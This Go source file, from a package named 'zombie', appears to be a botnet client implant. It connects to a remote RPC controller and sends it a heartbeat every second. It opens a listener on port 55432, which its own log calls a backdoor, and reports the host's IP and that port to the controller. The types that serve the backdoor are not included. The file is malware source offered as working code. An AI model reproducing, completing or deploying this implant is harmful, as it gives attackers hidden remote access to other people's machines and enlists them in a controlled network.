package zombie

import (
	"log"
	"net"
	"net/rpc"
	"time"

	"github.com/astaxie/beego/logs"
)

type Client struct {
	stopSign        chan int
	rpc             *rpc.Client
	args            *RpcArgs
	backDoorAddress chan string

	log *logs.BeeLogger
}
type RpcArgs struct {
	Argu string
}

var err error

func NewClient(remoteAddress string) (client *Client, err error) {
	client = new(Client)
	client.args = new(RpcArgs)
	client.backDoorAddress = make(chan string)
	client.stopSign = make(chan int)
	client.rpc, err = rpc.Dial("tcp", remoteAddress)
	client.log = logs.NewLogger(100000)
	client.log.EnableFuncCallDepth(true)
	client.log.SetLogger("console", "")
	if err != nil {
		return nil, err
	}
	return client, nil
}

func (client *Client) Run() {
	go client.heartBeat(time.Second)
	go client.openBackDoor()
	go client.sendBackDoorAddress(<-client.backDoorAddress)
	<-client.stopSign
}

func (client *Client) sendBackDoorAddress(address string) {
	var reply *int
	client.args.Argu = address
	err = client.rpc.Call("HeaderReceiver.GetBackDoorAddress", client.args, &reply)
	if err != nil {
		client.log.Error(err.Error())
		client.stopSign <- 1
	}
}

func (client *Client) openBackDoor() {

	listenerPort := ":55432"
	backDoorServer := new(BackDoorServer)
	backDoorServer.log = logs.NewLogger(100000)
	backDoorServer.log.SetLevel(log.Llongfile)
	backDoorServer.log.SetLogger("console", "")

	listener, err := net.Listen("tcp", listenerPort)
	if err != nil {
		client.log.Error(err.Error())
		client.stopSign <- 1
	}

	backDoorServer.log.Informational("opened the backdoor at %s", listener.Addr().String())
	backDoor := new(BackDoor)
	backDoor.Address = listener.Addr().String()

	backDoorServer.Register(backDoor)

	localIp, err := GetIp()

	if err != nil {
		client.log.Error(err.Error())
		client.stopSign <- 1
	}

	client.backDoorAddress <- localIp + listenerPort
	backDoorServer.Accept(listener)
}

func (client *Client) recordError(err error) {

}

func (client *Client) heartBeat(gap time.Duration) error {
	for {
		var reply *int
		time1 := time.Now()
		err = client.rpc.Call("HeaderReceiver.HeartBeat", client.args, &reply)
		if err != nil {
			client.log.Error(err.Error())
			client.stopSign <- 1
		}
		time2 := time.Now()
		diff := time2.Sub(time1)
		client.log.Informational("Sending Heart Beat:" + diff.String())
		<-time.Tick(gap)
	}
}
